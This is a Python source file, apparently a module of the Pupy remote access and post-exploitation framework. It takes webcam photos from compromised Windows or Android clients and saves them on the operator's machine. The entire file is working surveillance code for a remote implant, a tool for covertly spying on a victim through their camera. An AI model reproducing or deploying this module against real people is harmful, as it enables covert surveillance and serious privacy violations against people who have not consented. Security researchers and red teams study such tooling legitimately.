# -*- coding: UTF8 -*-

# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

from pupylib.PupyModule import *
import os
import os.path
import textwrap
import logging
import datetime
from zlib import compress, crc32
import struct
import subprocess

__class_name__="WebcamSnapModule"

def pil_save(filename, pixels, width, height):
    from PIL import Image, ImageFile
    buffer_len = (width * 3 + 3) & -4
    img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
    ImageFile.MAXBLOCK = width * height
    img=img.transpose(Image.FLIP_TOP_BOTTOM)
    img.save(filename, quality=95, optimize=True, progressive=True)
    logging.info('webcam snap saved to %s'%filename)

@config(cat="gather", compat=["windows", "android"])
class WebcamSnapModule(PupyModule):
    """ take a webcam snap :) """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
        self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default: %(default)s)')
        self.arg_parser.add_argument('-n', '--nb-cameras', action='store_true', help='print number of cameras (Android Only)')
        self.arg_parser.add_argument('-q', '--jpg-quality', type=int, default=40, help='define jpg quality (Android Only) (default: %(default)s)')
        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')

    def run(self, args):
        try:
            os.makedirs(os.path.join("data","webcam_snaps"))
        except Exception:
            pass
        filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
        if self.client.is_windows():
            self.client.load_package("vidcap")
            dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
            self.info("device %s exists, taking a snap ..."%args.device)
            buff, width, height = dev.getbuffer()
            pil_save(filepath, buff, width, height)
        elif self.client.is_android():
            self.client.load_package("pupydroid.camera")
            if args.nb_cameras == True:
                print "[+] Number of cameras: {0}".format(self.client.conn.modules['pupydroid.camera'].numberOfCameras())
            data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device, args.jpg_quality)
            with open(filepath,"w") as f:
                f.write(data)
        if args.view:
            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
        self.success("webcam picture saved to %s"%filepath)


